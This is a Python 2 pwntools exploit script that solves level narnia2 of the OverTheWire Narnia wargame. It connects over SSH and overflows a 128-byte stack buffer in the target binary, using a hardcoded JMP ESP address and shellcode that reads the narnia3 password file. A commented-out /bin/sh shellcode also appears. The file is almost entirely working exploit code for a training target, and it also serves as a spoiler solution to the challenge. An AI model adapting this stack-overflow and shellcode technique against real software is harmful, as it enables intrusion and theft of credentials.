#!/usr/bin/env python2
from __future__ import print_function
import pwn
import getpass
import sys

# Configuration variables
config = {
        'user': 'narnia2',
        'executable': '/narnia/narnia2',
        'password_file_path': '/etc/narnia_pass/narnia3',
        'host': 'narnia.labs.overthewire.org',
        'port': 2226
        }
pwn.context.arch = 'i386'
pwn.context.os = 'linux'

# Get password for SSH login
try:
    password = getpass.getpass(prompt='{} password: '.format(config['user']))
except Exception as e:
    print('[-] Error getting password: ' + e)
    sys.exit(-1)

# Login to SSH
s = pwn.tubes.ssh.ssh(host=config['host'],
                      port=config['port'],
                      user=config['user'],
                      password=password)

# Overwrite function stack space
locals_len = 132
local_vars = "\xCC" * locals_len

# Location of jmp esp in libc
# TODO Automate retrieval of a valid JMP ESP as an exercise
jmp_esp = "\xc7\x73\xff\xf7"  # 0xf7ff73c7

# system("/bin/sh")
# shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68"
# "\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

# asm = pwn.shellcraft.i386.linux.cat('/etc/narnia_pass/narnia3')
asm = pwn.shellcraft.i386.linux.cat(config['password_file_path'])
shellcode = pwn.asm(asm)

# locals(128 byte char buffer + EBP) + jmp_esp(EIP) + Shellcode on stack
payload = local_vars + jmp_esp + shellcode

p = s.process(argv=[config['executable'], payload],
              raw=True)
print('Narnia3 password: {}'.format(p.recvall()))
p.close()
s.close()
